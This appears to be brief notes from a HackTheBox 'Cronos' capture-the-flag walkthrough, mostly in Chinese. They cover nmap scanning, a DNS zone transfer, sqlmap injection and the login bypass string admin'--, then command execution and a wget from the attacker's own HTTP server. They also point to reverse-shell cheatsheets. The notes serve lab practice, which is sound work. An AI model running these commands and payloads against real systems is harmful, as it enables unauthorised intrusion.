
#CronOS

``` 
nmap -sC -sV -oA nmap/cronos 10.10.10.13
```
将ip改为域名，10.10.10.13 -> cronos.htb
```
nslookup
> server 10.10.10.13
> 10.10.10.13
> >cronos.htb


dig axfr @10.10.10.13 cronos.htb
```
得到admin.centos.htb, 将request请求复制下，存入文档，用sqlmap进行SQL注入
``` 
sqlmap -r login.req 
```
账号admin'---  
进入目标地址，则是命令执行  
google -> pentestmonkey reverse shell cheatsheet  
本机开HTTP服务，上传文件
``` 
python -m SimpleHTTPServer
```
远程主机，访问
``` 
wget -r http://10.10.15.20:8000/
```
google -> laravel create schedule command terminal shell bash 




